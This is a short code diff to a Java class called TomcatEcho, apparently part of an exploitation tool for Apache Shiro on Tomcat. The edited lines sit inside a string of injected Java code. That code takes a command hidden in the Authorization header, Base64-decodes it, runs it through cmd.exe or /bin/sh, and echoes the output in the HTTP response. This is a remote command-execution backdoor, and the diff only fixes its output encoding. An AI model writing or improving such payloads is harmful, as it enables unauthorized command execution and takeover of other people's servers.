@@ -87,7 +87,7 @@ public class TomcatEcho {
                 "                            if (var3 != null && !var3.isEmpty()) {\n" +
                 "                                var3 = org.apache.shiro.codec.Base64.decodeToString(var3.replaceAll(\"Basic \", \"\"));\n" +
                 "                                String[] var12 = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", var3} : new String[]{\"/bin/sh\", \"-c\", var3};\n" +
-                "                                writeBody(var2, (new java.util.Scanner((new ProcessBuilder(var12)).start().getInputStream())).useDelimiter(\"\\\\A\").next().getBytes());\n" +
+                "                                writeBody(var2, (new java.util.Scanner((new ProcessBuilder(var12)).start().getInputStream())).useDelimiter(\"\\\\A\").next().getBytes(\"UTF-8\"));\n" +
                 "                                var4 = true;\n" +
                 "                            }\n" +
                 "\n" +
